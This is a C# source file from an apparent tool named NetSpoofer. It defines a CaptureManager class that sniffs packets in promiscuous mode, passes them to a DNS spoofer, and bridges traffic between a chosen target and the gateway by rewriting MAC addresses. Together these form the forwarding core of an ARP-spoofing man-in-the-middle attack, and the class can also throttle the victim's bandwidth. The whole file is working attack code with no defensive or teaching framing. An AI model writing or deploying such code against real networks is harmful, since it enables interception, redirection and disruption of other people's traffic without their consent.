using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace NetSpoofer {
    public class CaptureManager {
        private readonly ICaptureDevice _dev;
        private Thread? _thread;
        private volatile bool _running;
        public event Action<Packet>? OnPacket;
        public bool EnableForwarding { get; set; }
        private BandwidthLimiter? _limiter;
        private IPAddress? _targetIp, _gatewayIp;
        private PhysicalAddress? _targetMac, _gatewayMac;
        private readonly ConcurrentQueue<RawCapture> _q = new();
        private DnsSpoofer? _dns;

        public CaptureManager(ICaptureDevice dev) { _dev = dev; }
        public void AttachBandwidthLimiter(BandwidthLimiter limiter) => _limiter = limiter;
        public void AttachDnsSpoof(DnsSpoofer dns) => _dns = dns;
        public void SetBridgePeers(IPAddress targetIp, IPAddress gatewayIp) { _targetIp = targetIp; _gatewayIp = gatewayIp; }

        public void Start() {
            _dev.Open(DeviceModes.Promiscuous, 1);
            _dev.OnPacketArrival += (s, e) => _q.Enqueue(e.GetPacket());
            _dev.StartCapture();
            _running = true;
            _thread = new Thread(Loop) { IsBackground = true };
            _thread.Start();
        }
        public void Stop() { _running = false; try { _dev.StopCapture(); } catch { } try { _dev.Close(); } catch { } }

        private void Loop() {
            while (_running) {
                if (!_q.TryDequeue(out var rc)) { Thread.Sleep(1); continue; }
                var packet = Packet.ParsePacket(rc.LinkLayerType, rc.Data);
                OnPacket?.Invoke(packet);
                _dns?.Process(packet, _dev);
                if (EnableForwarding) Forward(packet);
            }
        }

        private void Forward(Packet pkt) {
            var eth = pkt.Extract<EthernetPacket>();
            var ip = pkt.Extract<IPv4Packet>();
            if (eth == null || ip == null) return;
            if (_targetIp == null || _gatewayIp == null) return;
            _targetMac ??= ArpSpoofer.ResolveMacAddress(_targetIp);
            _gatewayMac ??= ArpSpoofer.ResolveMacAddress(_gatewayIp);
            if (_targetMac == null || _gatewayMac == null) return;

            // Bridge: if packet from target -> send to gateway; if from gateway -> send to target
            if (ip.SourceAddress.Equals(_targetIp)) {
                eth.DestinationHardwareAddress = _gatewayMac;
                eth.SourceHardwareAddress = _dev.MacAddress;
                var bytes = eth.Bytes;
                _limiter?.ThrottleUpload(bytes.Length);
                SendBytes(bytes);
            } else if (ip.SourceAddress.Equals(_gatewayIp)) {
                eth.DestinationHardwareAddress = _targetMac;
                eth.SourceHardwareAddress = _dev.MacAddress;
                var bytes = eth.Bytes;
                _limiter?.ThrottleDownload(bytes.Length);
                SendBytes(bytes);
            }
        }

        public void SendBytes(byte[] bytes) {
            var inj = _dev as IInjectionDevice;
            if (inj != null) {
                inj.SendPacket(bytes);
            }
        }
    }
}